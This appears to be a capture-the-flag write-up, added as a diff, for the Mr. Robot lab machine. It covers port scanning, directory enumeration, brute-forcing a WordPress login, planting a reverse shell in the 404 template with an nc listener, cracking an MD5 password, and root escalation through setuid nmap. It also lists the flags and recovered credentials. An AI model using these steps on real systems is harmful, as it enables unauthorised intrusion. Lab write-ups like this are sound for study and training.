@@ -1,0 +1,96 @@
+#get the ip
+#nmap 
+sudo nmap -sS ip
+sudo nmap -A ip
+sudo nmap -sV ip
+
+#three ports, one closed and 2 open 
+ssh   22
+http  80
+https 4
+
+
+#gobuster
+gobuster -u http://ip/ -w <wordlist> -t <number of thread> -o <file name to save>
+
+#got some files 
+/images
+/videos
+/admin
+/wp-login.php
+
+
+#robots.txt
+http://ip/robots.txt
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+
+#download the fsociety.dic
+#search for 
+http://ip/key-1-of-3.txt
+#got the first flag
+
+flag:073403c8a58a1f80d943455fb30724b9
+
+
+#wp-login.php
+
+http://wp-login.php
+
+#need credentials
+#use wpscan to bruteforce wordpress login
+#https://github.com/wpscanteam/wpscan.git
+
+
+#wpscan
+#guessing username as elliot and password using downloaded dic file
+wpscan --url http://10.10.110.106/wp-login.php --passwords fsocietysortunique.dic --usernames elliot
+
+#now you got the username and password for the wordpress login
+username:elliot
+password:ER28-0652
+
+#login and appearance -> editot -> template 404.php paste the reverse shell
+
+#load
+
+nc -lvnp <port>
+
+http://ip/404.php
+
+#go to terminal now you got the shell
+
+cd /home/robot
+cat key-2-of-3.txt
+#permission denied
+cat password.raw-md5
+#robot:c3fcd3d76192e4007dfb496cca67e13b
+#md5 hash for robot password
+
+hashcat -m 0 'c3fcd3d76192e4007dfb496cca67e13b' /rockyou.txt
+
+cracked password for robot user : abcdefghijklmnopqrstuvwxyz
+
+#to get stable shell
+#use 
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+su robot
+
+#key 2 found
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
+
+find / -perm +6000 2>/dev/null | grep '/bin/'
+#using nmap for previlige escalation
+nmap --interactive
+!sh
+cd /root
+cat key-3-of-3.txt
+#found final flag
+04787ddef27c3dee1ee161b21670b4e4
+
